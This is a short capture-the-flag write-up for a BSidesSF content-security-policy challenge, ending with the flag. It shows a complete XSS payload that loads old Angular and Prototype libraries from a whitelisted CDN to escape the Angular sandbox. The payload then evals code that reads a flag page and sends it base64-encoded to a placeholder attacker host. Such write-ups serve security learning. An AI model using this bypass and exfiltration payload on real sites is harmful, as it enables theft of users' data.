**Challenge**: https://csp-2-f692634b.challenges.bsidessf.net/

CSP Evaluator: https://csp-evaluator.withgoogle.com/
- Interesring `script-src`

The challenge page contains a whitelist including `cdnjs.cloudflare.com`. Thus, we can import any library from this CDN.

To solve this challenge we will use a well-known technique, which is based on import vulnerable libraries.

The payload below imports the Angular framework 1.0.1, which allows us to bypass CSP. Then, it is imported the prototype 1.7.2 library to make Angular sandbox escape, because with only Angular is not possible to execute arbitrary JS code.

```javascript
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.min.js"></script>

<div ng-app bg-csp>
<script src="//cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.min.js"></script>
{{$on.curry.call().eval("function reqListener () {window.location='<Your Host>/?a='+btoa(this.responseText);};oReq = new XMLHttpRequest();oReq.onload = reqListener;oReq.open('get', 'csp-two-flag', true);oReq.send();")}}

</div>
```

Edit the paylaod in `window.location` with your host.

Reference: https://blog.0daylabs.com/2016/09/09/bypassing-csp/

**Flag**: CTF{Can_Still_Pwn}
